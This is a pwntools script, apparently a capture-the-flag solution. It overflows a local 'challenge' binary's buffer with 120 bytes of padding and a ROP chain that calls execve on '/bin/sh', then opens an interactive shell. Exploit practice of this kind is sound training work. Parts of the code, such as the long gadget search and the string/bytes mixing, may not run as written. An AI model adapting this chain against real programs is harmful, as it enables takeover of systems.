from pwn import *

OFFSET = 120

context.arch = "amd64"
s = process("./challenge")
elf = ELF("./challenge")
rop = ROP("./challenge")

rop.raw(rop.find_gadget(["pop rdi", "pop rcx", "pop rdx", "pop rsi", "ret"]))
rop.raw(next(elf.search("/bin/sh")))
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(rop.find_gadget(["pop rax", "syscall"]))
rop.raw(59)

print(rop.dump())

s.recvuntil("omething:")
s.sendline("A"*OFFSET+flat(rop.chain()))

s.interactive()